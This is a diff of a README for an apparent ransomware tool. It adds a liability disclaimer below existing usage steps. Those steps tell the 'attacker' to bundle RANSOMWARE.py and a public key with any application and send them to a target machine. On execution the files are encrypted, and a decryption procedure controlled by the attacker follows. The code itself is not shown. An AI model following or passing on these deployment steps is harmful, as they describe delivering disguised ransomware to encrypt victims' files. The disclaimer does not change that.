@@ -14,3 +14,10 @@ $ cryptography~=2.9.2
 * [ATTACKER] send the 'RANSOMWARE.py' and 'public.pem' bundled together to the target machine in any way (bind the files along with any application).
 * [TARGET] after the 'RANSOMWARE.py' gets executed all the mentioned extensions(in the code) files will be encrypted.
 * [ATTACKER] Run the fernet key decryption file to decrypt the EMAIL_ME.txt(be on your desktop) file, this will give you a PUT_ME_ON_DESKTOP.txt file, once you put this on the desktop the ransomware will decrypt the encrypted files in that directory.
+
+
+#### Disclaimer
+
+> This tool is only for testing and academic purposes and can only be used where strict consent has been given. Do not use it for
+> illegal purposes! It is the end user’s responsibility to obey all applicable local, state and federal laws. Developers assume no
+> liability and are not responsible for any misuse or damage caused by this tool and software in general.
